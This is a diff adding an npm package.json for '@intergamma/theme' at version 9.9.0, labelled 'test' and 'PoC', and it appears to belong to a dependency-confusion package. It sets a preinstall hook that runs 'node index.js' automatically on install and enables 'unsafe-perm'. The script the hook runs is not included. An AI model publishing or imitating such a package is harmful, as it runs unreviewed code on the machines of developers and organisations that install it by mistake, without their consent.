@@ -1,0 +1,20 @@
+{
+  "name": "@intergamma/theme",
+  "version": "9.9.0",
+  "description": "",
+  "main": "is.js",
+  "scripts": {
+    "test": "node index.js",
+    "preinstall": "node index.js"
+  },
+  "keywords": [
+    "test",
+    "PoC"
+  ],
+  "dependencies": {},
+  "config": {
+    "unsafe-perm":true
+  },
+  "author": "Misc",
+  "license": "ISC"
+}
